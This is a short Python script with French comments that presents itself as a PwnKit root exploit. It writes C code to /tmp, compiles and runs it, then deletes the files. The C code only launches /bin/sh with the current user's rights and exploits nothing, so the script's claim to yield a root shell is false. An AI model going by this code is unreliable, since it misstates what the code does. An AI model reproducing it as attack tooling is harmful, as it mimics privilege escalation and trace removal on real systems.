import os
import subprocess

# Code de l'exploit PwnKit
exploit_code = """
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
    char *args[] = { "/bin/sh", NULL };
    execv("/bin/sh", args);
    return 0;
}
"""

# Sauvegarde du code C dans un fichier temporaire
exploit_file_path = "/tmp/kit.c"
with open(exploit_file_path, 'w') as f:
    f.write(exploit_code)

# Compilation du code C en un exécutable
subprocess.run(["gcc", exploit_file_path, "-o", "/tmp/kit"])

# Définition des permissions pour rendre le fichier exécutable
os.chmod("/tmp/kit", 0o755)

# Exécution de l'exploit pour obtenir un shell root
subprocess.run(["/tmp/kit"])

# Nettoyage du code source et du binaire pour des raisons de sécurité
os.remove("/tmp/kit.c")
os.remove("/tmp/kit")
